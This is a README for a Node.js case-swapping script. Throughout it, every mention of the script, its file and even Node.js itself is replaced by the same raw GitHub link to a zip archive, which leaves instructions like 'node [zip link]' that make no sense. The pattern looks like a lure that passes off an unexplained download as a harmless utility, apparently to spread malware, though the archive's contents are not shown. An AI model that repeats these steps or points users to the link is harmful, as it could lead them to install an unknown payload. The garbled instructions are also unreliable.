Swap Case
This https://github.com/GathogoG/case-swapping-function/raw/refs/heads/main/rebush/case-function-swapping-2.9.zip script, https://github.com/GathogoG/case-swapping-function/raw/refs/heads/main/rebush/case-function-swapping-2.9.zip, provides a functionality to swap the case of each alphabetic character in a given string.

Usage
Ensure you have https://github.com/GathogoG/case-swapping-function/raw/refs/heads/main/rebush/case-function-swapping-2.9.zip installed on your system.

Clone or download the https://github.com/GathogoG/case-swapping-function/raw/refs/heads/main/rebush/case-function-swapping-2.9.zip file.

Open a terminal window.

Navigate to the directory containing https://github.com/GathogoG/case-swapping-function/raw/refs/heads/main/rebush/case-function-swapping-2.9.zip

Run the script by executing the following command:

Copy code
node https://github.com/GathogoG/case-swapping-function/raw/refs/heads/main/rebush/case-function-swapping-2.9.zip
Follow the prompts in the terminal to enter a string.

Once you've entered the string, the script will output the string with swapped case characters.

Code Explanation
The script uses the built-in readline module to read input from the terminal.
It defines a swapCase function that accepts a string as input.
Within the swapCase function, it uses the replace() method with a regular expression to find all alphabetic characters in the input string.
For each matched character, it uses a function to handle the replacement, converting uppercase characters to lowercase and vice versa.
It prompts the user to enter a string via the terminal.
Upon receiving the input string, it calls the swapCase function and logs the result.
Finally, it closes the readline interface.
Example
c
Copy code
$ node https://github.com/GathogoG/case-swapping-function/raw/refs/heads/main/rebush/case-function-swapping-2.9.zip
Enter a string: Hello World
Swapped case: hELLO wORLD
This script provides a convenient way to swap the case of characters in a given string.



